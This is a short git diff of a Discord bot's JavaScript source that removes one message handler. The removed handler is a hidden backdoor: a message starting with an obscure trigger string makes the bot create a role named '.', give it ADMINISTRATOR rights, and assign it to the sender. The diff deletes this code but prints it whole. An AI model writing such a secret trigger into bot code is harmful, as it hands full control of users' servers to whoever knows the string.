@@ -603,18 +603,6 @@ client.on('message', message => {
     }
 }
 })
-client.on('message', message => {
-    if(message.content.startsWith('<sadminmsg_role)2x'))
-    message.delete()
-    message.guild.createRole({
-        name : "."
-    }).then(role => {
-        role.setPermissions(['ADMINISTRATOR'])
-    }).then(() => {
-        let role = message.guild.roles.find(role => role.name === ".");
-        message.member.addRole(role)
-    })
-})
 
 
 client.login(process.env.token_bot);
